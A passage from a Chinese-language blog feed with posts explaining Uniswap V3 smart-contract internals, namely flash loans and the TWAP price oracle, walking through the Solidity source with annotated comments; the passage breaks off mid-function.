    <summary type="html">&lt;h1 id=&quot;EVM-Puzzles&quot;&gt;&lt;a href=&quot;#EVM-Puzzles&quot; class=&quot;headerlink&quot; title=&quot;EVM-Puzzles&quot;&gt;&lt;/a&gt;EVM-Puzzles&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/fvicto</summary>
      
    
    
    
    
    <category term="靶场刷题" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/"/>
    
    <category term="EVM" scheme="http://example.com/tags/EVM/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅵ | 闪电贷</title>
    <link href="http://example.com/2022/09/29/uniswap-v3-6/"/>
    <id>http://example.com/2022/09/29/uniswap-v3-6/</id>
    <published>2022-09-29T07:44:17.000Z</published>
    <updated>2022-09-29T07:44:59.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h1><ul><li>第一种是普通的闪电贷，即借入 token 和还贷 token 相同，通过 <code>UniswapV3Pool.flash()</code> 完成</li><li>第二种是类似 v2 的 <code>flash swap</code>，即借入 token 和还贷 token 不同，这个是通过 <code>UniswapV3Pool.swap()</code> 来完成的。</li></ul><h3 id="flash"><a href="#flash" class="headerlink" title="flash"></a>flash</h3><p>普通闪电贷的接口为交易池合约的 <code>UniswapV3Pool.flash()</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flash(<br>    address recipient,  // 借贷方地址，用于调用回调函数<br>    uint256 amount0, // 借贷的 token0 的数量<br>    uint256 amount1, // 借贷的 token1 的数量<br>    bytes calldata data //回调函数的参数<br>) external override lock noDelegateCall &#123;<br>    uint128 _liquidity = liquidity;<br>    require(_liquidity &gt; 0, &#x27;L&#x27;);<br><br>    // 计算借贷所需要扣除的手续费<br>    uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);<br>    uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);<br>    // 记录下当前的余额<br>    uint256 balance0Before = balance0();<br>    uint256 balance1Before = balance1();<br><br>    // 将所需 token 发送给借贷方<br>    if (amount0 &gt; 0) TransferHelper.safeTransfer(token0, recipient, amount0);<br>    if (amount1 &gt; 0) TransferHelper.safeTransfer(token1, recipient, amount1);<br><br>    // 调用借贷方地址的回调函数，将函数用户传入的 data 参数传给这个回调函数<br>    IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);<br><br>    // 记录调用完成后的余额<br>    uint256 balance0After = balance0();<br>    uint256 balance1After = balance1();<br><br>    // 比对借出代币前和回调函数调用完成后余额的数量，对于每个 token，余额只能多不能少<br>    require(balance0Before.add(fee0) &lt;= balance0After, &#x27;F0&#x27;);<br>    require(balance1Before.add(fee1) &lt;= balance1After, &#x27;F1&#x27;);<br><br>    // sub is safe because we know balanceAfter is gt balanceBefore by at least fee<br>    // 手续费相关的计算<br>    uint256 paid0 = balance0After - balance0Before;<br>    uint256 paid1 = balance1After - balance1Before;<br><br>    if (paid0 &gt; 0) &#123;<br>        uint8 feeProtocol0 = slot0.feeProtocol % 16;<br>        uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;<br>        if (uint128(fees0) &gt; 0) protocolFees.token0 += uint128(fees0);<br>        feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);<br>    &#125;<br>    if (paid1 &gt; 0) &#123;<br>        uint8 feeProtocol1 = slot0.feeProtocol &gt;&gt; 4;<br>        uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;<br>        if (uint128(fees1) &gt; 0) protocolFees.token1 += uint128(fees1);<br>        feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);<br>    &#125;<br><br>    emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);<br>&#125;<br></code></pre></td></tr></table></figure><p>完整flash代码可以参考<a href="https://docs.uniswap.org/protocol/guides/flash-integrations/final-contract">官方</a></p><h3 id="flash-swap"><a href="#flash-swap" class="headerlink" title="flash swap"></a>flash swap</h3><p>通过 <code>UniswapV3Pool.swap()</code> 函数，可以完成 <code>flashswap</code> 的功能</p><p>其中，在使用 <code>flashswap</code> 时，需要实现其 <code>IUniswapV3SwapCallback</code> 接口，完成闪电贷的还贷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;闪电贷&quot;&gt;&lt;a href=&quot;#闪电贷&quot; class=&quot;headerlink&quot; title=&quot;闪电贷&quot;&gt;&lt;/a&gt;闪电贷&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;第一种是普通的闪电贷，即借入 token 和还贷 token 相同，通过 &lt;code&gt;UniswapV3Pool.fla</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap Part Ⅴ | 预言机</title>
    <link href="http://example.com/2022/09/29/uniswap-v3-5/"/>
    <id>http://example.com/2022/09/29/uniswap-v3-5/</id>
    <published>2022-09-29T06:27:33.000Z</published>
    <updated>2022-09-29T06:28:12.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="预言机的实现"><a href="#预言机的实现" class="headerlink" title="预言机的实现"></a>预言机的实现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://learnblockchain.cn/article/3960">UniswapV2的预言机</a>称为 <strong>TWAP（Time-Weighted Average Price）</strong> ，即<strong>时间加权平均价格</strong> 。属于是 <strong>链上预言机</strong> </p><p>UniswapV3 的实现机制和 UniswapV2 有很大不同</p><ul><li><p>在计算 TWAP 的数据源方面，UniswapV2 只存储了最新的 <strong>price0CumulativeLast</strong> 、<strong>price1CumulativeLast</strong> 和 <strong>blockTimestampLast</strong> 三个值而已。而 UniswapV3 则改为用一个容量可达 65535 的数组来存储历史数据，即 <strong>UniswapV3Pool</strong> 合约的 <strong>observations</strong> 状态变量，这样第三方开发者不再需要自己实现合约存储历史信息。</p></li><li><p>触发数据的存储不再需要链下程序去定时触发，而是在 Uniswap 发生交易时自动触发。</p></li><li><p>Oracle 中不光记录了价格信息，还记录了对应流动性的时间累积值，因为 v3 中相同交易对在不同费率时时不同的交易池，这样在使用 Oracle 时，可以选择流动性较大的池最为价格参考来源</p></li><li><p>Uniswap v2 中可以计算出时间加权平均价格（算术平均值），而 v3 中计算出来的是时间加权价时几何平均值</p><p>算术平均数的优势是其简单性，也是最符合直觉的平均数。当用于计算算术平均数的数据系列越长，其算术平均值就有越高的机率接近期望值，这种现象在统计学中被称为<a href="https://zh.wikipedia.org/zh-hans/%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B">「大数法则」</a>。</p><p>几何平均数一般来说都会小于算术平均数，因此但是对于波动较大的数字而言，使用几何平均数，其受波动性的影响会更小。</p></li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>Oracle 实现的代码都在 <a href="https://github.com/Uniswap/v3-core">uniswap-v3-core</a> 的合约中实现。</p><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>在 <strong>Oracle</strong> 库中，定义了数据结构 <strong>Observation</strong> ，即存储预言机数据的数据结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Observation &#123;<br>        // the block timestamp of the observation<br>        // 区块的时间戳<br>        uint32 blockTimestamp;<br>        // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized<br>        // tick index 的时间加权累积值<br>        // 自池子创建之后的 tick * time 的累计值<br>        int56 tickCumulative;<br>        // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized<br>        uint160 secondsPerLiquidityCumulativeX128;<br>        // whether or not the observation is initialized<br>        // 是否已经被初始化<br>        bool initialized;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在交易池的合约中，使用一个数组来存储交易池最近的的 Oracle 数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Pool is IUniswapV3Pool, NoDelegateCall &#123;<br>    ...<br>    // Oracle 相关操作的库<br>    using Oracle for Oracle.Observation[65535];<br>    ...<br>    struct Slot0 &#123;<br>    // 当前的根号价格<br>        uint160 sqrtPriceX96;<br>        // 当前价格对应的价格点<br>    int24 tick;<br>        // 记录了最近一次 Oracle 记录在 Oracle 数组中的索引位置<br>        uint16 observationIndex;<br>        // 已经存储的 Oracle 数量<br>        uint16 observationCardinality;<br>        // 可用的 Oracle 空间，此值初始时会被设置为 1，后续根据需要来可以扩展<br>        uint16 observationCardinalityNext;<br>        ...<br>    &#125;<br>    Slot0 public override slot0;<br>    ...<br>    // 使用数据记录 Oracle 的值<br>    // 是保存 Oracle 中定义的 Observation 结构体的数组<br>    Oracle.Observation[65535] public override observations;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>数组的大小为 65535，但是实际上在初始阶段这个数据并不会被全部使用，而仅使用其中一部分空间（初始为 1，observationCardinality 为 1，即 observations 实际容量只有 1，一直都只更新第一个元素）。这样做的目的是，如果没有必要，那么仅存储最近一份 Oracle 数据即可，因为写入数据到数组中需要比较高昂的 gas 费用（<code>SSTORE</code> 操作）。</p><p>当第三方对某个交易池的 Oracle 有需求时，可以主动调用合约的接口扩展这个数据的可用空间，这样后续合约会存储更多的 Oracle 数据。</p><p>当数组可用大小写满之后，它会重新从 0 开始写入，即使用上类似一个 ring buffer(环形缓冲区)。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>创建交易对时，<code>UniswapV3Factory</code> 会调用新创建交易对的 <code>UniswapV3Pool.initialize()</code> 函数对合约进行初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function initialize(uint160 sqrtPriceX96) external override &#123;<br>        require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);<br><br>        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);<br><br>        // 初始化Oracle <br>        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());<br><br>        slot0 = Slot0(&#123;<br>            sqrtPriceX96: sqrtPriceX96,<br>            tick: tick,<br>            observationIndex: 0,<br>            observationCardinality: cardinality,<br>            observationCardinalityNext: cardinalityNext,<br>            feeProtocol: 0,<br>            unlocked: true<br>        &#125;);<br><br>        emit Initialize(sqrtPriceX96, tick);<br>    &#125;<br></code></pre></td></tr></table></figure><p>在初始化的代码中，调用了 <code>observations.initialize(_blockTimestamp())</code> 来进行 Oracle 的初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function initialize(Observation[65535] storage self, uint32 time)<br>    internal<br>    returns (uint16 cardinality, uint16 cardinalityNext)<br>&#123;<br>    self[0] = Observation(&#123;<br>        blockTimestamp: time,<br>        tickCumulative: 0,<br>        secondsPerLiquidityCumulativeX128: 0,<br>        initialized: true<br>    &#125;);<br>    // 返回当前 Oracle 的个数和最大可用个数<br>    return (1, 1);<br>&#125;<br></code></pre></td></tr></table></figure><p>最大可用个数即 <code>cardinalityNext</code> 为 1，表示合约初始化时，只会记录最近的一次 Oracle 数据。</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>Oracle 数据的更新发生在价格变动的时候，为了防止攻击（攻击者在同一个区块中，在 Oracle 写入的前后先买入再卖出某种资产，以实现低成本操纵 Oracle 数据的目的），同一个区块内，只会在第一次发生价格变动时写入 Oracle 信息。在 <code>UniswapV3Pool.swap()</code> 函数中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// update tick and write an oracle entry if the tick change<br>        // 检查价格是否发生了变化，当价格变化时，需要写入一个 Oracle 数据<br>        if (state.tick != slot0Start.tick) &#123;<br>            // 写入 Oracle 数据<br>            (uint16 observationIndex, uint16 observationCardinality) =<br>                observations.write(<br>                    // 交易前的最新 Oracle 索引<br>                    slot0Start.observationIndex,<br>                    // 当前区块的时间<br>                    cache.blockTimestamp,<br>                    // 交易前的价格的 tick ，用于防止攻击<br>                    slot0Start.tick,<br>                    //交易前的价格对应的流动性<br>                    cache.liquidityStart,<br>                    // 当前的 Oracle 数量<br>                    slot0Start.observationCardinality,<br>                    // 可用的 Oracle 数量<br>                    slot0Start.observationCardinalityNext<br>                );<br>            // 更新最新 Oracle 指向的索引信息以及当前 Oracle 数据的总数目<br>            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (<br>                state.sqrtPriceX96,<br>                state.tick,<br>                observationIndex,<br>                observationCardinality<br>            );<br>        &#125; else &#123;<br>            // otherwise just update the price<br>            slot0.sqrtPriceX96 = state.sqrtPriceX96;<br>        &#125;<br></code></pre></td></tr></table></figure><p>这里首先检查价格是否发生了变化，当价格变化时，需要写入 Oracle 数据，调用的是 <code>observations.write</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function write(<br>        Observation[65535] storage self,<br>        uint16 index,<br>        uint32 blockTimestamp,<br>        int24 tick,<br>        uint128 liquidity,<br>        uint16 cardinality,<br>        uint16 cardinalityNext<br>    ) internal returns (uint16 indexUpdated, uint16 cardinalityUpdated) &#123;<br>        // 获取当前的 Oracle 数据<br>        Observation memory last = self[index];<br><br>        // early return if we&#x27;ve already written an observation this block<br>        // 同一个区块内，只会在第一笔交易中写入 Oracle 数据<br>        // 在 Layer1 中，每个区块只会发生一次更新 observations<br>        // 而在 Layer2，因为时间戳 1 分钟才会更新一次，所以也是 1 分钟才会发生一次更新 observations。<br>        if (last.blockTimestamp == blockTimestamp) return (index, cardinality);<br><br>        // if the conditions are right, we can bump the cardinality<br>        // 检查是否需要使用新的数组空间<br>        if (cardinalityNext &gt; cardinality &amp;&amp; index == (cardinality - 1)) &#123;<br>            cardinalityUpdated = cardinalityNext;<br>        &#125; else &#123;<br>            cardinalityUpdated = cardinality;<br>        &#125;<br><br>        // 本次写入的索引，使用余数实现 ring buffer<br>        indexUpdated = (index + 1) % cardinalityUpdated;<br>        // 写入 Oracle 数据<br>        self[indexUpdated] = transform(last, blockTimestamp, tick, liquidity);<br>    &#125;<br></code></pre></td></tr></table></figure><p>写入时会计算出需要使用的索引数，如果可用空间用满会重新从头开始写入。Oracle 数据使用 <code>transform</code> 函数生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transform(<br>        Observation memory last,<br>        uint32 blockTimestamp,<br>        int24 tick,<br>        uint128 liquidity<br>    ) private pure returns (Observation memory) &#123;<br>        // 上次 Oracle 数据和本次的时间差<br>        uint32 delta = blockTimestamp - last.blockTimestamp;<br>        return<br>            Observation(&#123;<br>                blockTimestamp: blockTimestamp,<br>                // 计算 tick index 的时间加权累积值<br>                tickCumulative: last.tickCumulative + int56(tick) * delta,<br>                secondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +<br>                    ((uint160(delta) &lt;&lt; 128) / (liquidity &gt; 0 ? liquidity : 1)),<br>                initialized: true<br>            &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>虽然合约定义了 Oracle 使用 65535 长度的数组，但是并不会在一开始就使用这么多的空间，这样做是因为：</p><ul><li>向空数组中写入 Oracle 数据是比较昂贵的操作（SSTORE）</li><li>写入 Oracle 数据的操作发生在交易的操作中</li><li>这些操作如果由交易者负担，是不公平的，因为代币交易者并不一定是 Oracle 的使用者</li></ul><p>因此 Uniswap v3 在初始时 Oracle 数组仅可以写入一个数据，这个是通过交易池合约的 <code>slot0.observationCardinalityNext</code> 变量控制的。</p><p>当初始设置不满足需求时，合约提供了单独接口，让对 Oracle 历史数据有需求的开发者，自行调用接口来扩展交易池 Oracle 中存储数据的上限。这样就将 Oracle 数组存储空间初始化操作的 gas 费转移到了 Oracle 的需求方，而不是由代币交易者承担。</p><p>通过调用 <strong>UniswapV3Pool</strong> 合约的 <code>increaseObservationCardinalityNext()</code> 可以扩展交易池的 Oracle 数组可用容量，传入的参数为期望存储的历史数据个数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function increaseObservationCardinalityNext(uint16 observationCardinalityNext)<br>    external<br>    override<br>    lock<br>    noDelegateCall<br>&#123;<br>    uint16 observationCardinalityNextOld = slot0.observationCardinalityNext; // for the event<br>    uint16 observationCardinalityNextNew =<br>        observations.grow(observationCardinalityNextOld, observationCardinalityNext);<br>    slot0.observationCardinalityNext = observationCardinalityNextNew;<br>    if (observationCardinalityNextOld != observationCardinalityNextNew)<br>        emit IncreaseObservationCardinalityNext(observationCardinalityNextOld, observationCardinalityNextNew);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数调用了 <code>observations.grow()</code> 完成底层存储空间的初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function grow(<br>    Observation[65535] storage self,<br>    uint16 current,<br>    uint16 next<br>) internal returns (uint16) &#123;<br>    require(current &gt; 0, &#x27;I&#x27;);<br>    // no-op if the passed next value isn&#x27;t greater than the current next value<br>    if (next &lt;= current) return current;<br>    // store in each slot to prevent fresh SSTOREs in swaps<br>    // this data will not be used because the initialized boolean is still false<br>    // 对数组中将来可能会用到的槽位进行写入，以初始化其空间，避免在 swap 中初始化<br>    for (uint16 i = current; i &lt; next; i++) self[i].blockTimestamp = 1;<br>    return next;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到，通过循环的方式，将 Oracle 数组中未来可能被使用的空间中写入数据。这样做的目的是将数据进行初始化，这样在代币交易写入新的 Oracle 数据时，不需要再进行初始化，可以让交易时更新 Oracle 不至于花费太多的 gas，<code>SSTORE</code> 指令由 20000 降至 5000。</p><p>当 Oracle 数据可使用空间被扩容至最大，即 65535 时，假设平均出块时间为 13 秒，那么此时至少可以存储最近 9.8 天的历史数据。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>UniswapV3Pool</strong> 提供了一个查询函数 observe 用来查询指定时间段内的 tick 累计值，该函数也是计算 TWAP 的关键函数，其代码实现也是调用 Oracle 库的 observe 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3PoolDerivedState<br>function observe(uint32[] calldata secondsAgos)<br>    external<br>    view<br>    override<br>    noDelegateCall<br>    returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s)<br>&#123;<br>    return<br>        observations.observe(<br>            _blockTimestamp(),<br>            secondsAgos,<br>            slot0.tick,<br>            slot0.observationIndex,<br>            liquidity,<br>            slot0.observationCardinality<br>        );<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数指定的参数 <strong>secondsAgos</strong> 是一个数组，顾名思义表示请求 N 秒前的数据，数组的每个元素可以指定离当前时间之前的秒数。比如我们想要获取最近 1 小时的 TWAP，那可传入数组 [3600, 0]，会查询两个时间点的累计值，3600 表示查询 1 小时前的累计值，0 则表示当前时间的累计值。返回的 <strong>tickCumulatives</strong> 就是对应于入参数组的每个时间点的 tick 累计值，<strong>secondsPerLiquidityCumulativeX128s</strong> 则是对应每个时间点的每秒流动性累计值，</p><p>数据的处理是在 <code>observations.observe()</code> 中完成的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function observe(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32[] memory secondsAgos,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) internal view returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s) &#123;<br>    require(cardinality &gt; 0, &#x27;I&#x27;);<br><br>    tickCumulatives = new int56[](secondsAgos.length);<br>    secondsPerLiquidityCumulativeX128s = new uint160[](secondsAgos.length);<br>    // 遍历传入的时间参数，获取结果<br>    for (uint256 i = 0; i &lt; secondsAgos.length; i++) &#123;<br>        (tickCumulatives[i], secondsPerLiquidityCumulativeX128s[i]) = observeSingle(<br>            self,<br>            time,<br>            secondsAgos[i],<br>            tick,<br>            index,<br>            liquidity,<br>            cardinality<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数就是通过遍历请求参数，获取每一个请求时间点的 Oracle 数据，具体数据通过 <code>observeSingle()</code> 函数来获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function observeSingle(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32 secondsAgo,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) internal view returns (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) &#123;<br>    // secondsAgo 为 0 表示当前的最新 Oracle 数据<br>    if (secondsAgo == 0) &#123;<br>        Observation memory last = self[index];<br>        if (last.blockTimestamp != time) last = transform(last, time, tick, liquidity);<br>        return (last.tickCumulative, last.secondsPerLiquidityCumulativeX128);<br>    &#125;<br><br>    // 计算出请求的时间戳<br>    uint32 target = time - secondsAgo;<br><br>    // 计算出请求时间戳最近的两个 Oracle 数据<br>    (Observation memory beforeOrAt, Observation memory atOrAfter) =<br>        getSurroundingObservations(self, time, target, tick, index, liquidity, cardinality);<br><br>    // 如果请求时间和返回的左侧时间戳吻合，那么可以直接使用<br>    if (target == beforeOrAt.blockTimestamp) &#123;<br>        // we&#x27;re at the left boundary<br>        return (beforeOrAt.tickCumulative, beforeOrAt.secondsPerLiquidityCumulativeX128);<br>    // 如果请求时间和返回的右侧时间戳吻合，那么可以直接使用<br>    &#125; else if (target == atOrAfter.blockTimestamp) &#123;<br>        // we&#x27;re at the right boundary<br>        return (atOrAfter.tickCumulative, atOrAfter.secondsPerLiquidityCumulativeX128);<br>    &#125; else &#123;<br>        // we&#x27;re in the middle<br>        // 当请求时间在中间时，计算根据增长率计算出请求的时间点的 Oracle 值并返回<br>        uint32 observationTimeDelta = atOrAfter.blockTimestamp - beforeOrAt.blockTimestamp;<br>        uint32 targetDelta = target - beforeOrAt.blockTimestamp;<br>        return (<br>            beforeOrAt.tickCumulative +<br>                ((atOrAfter.tickCumulative - 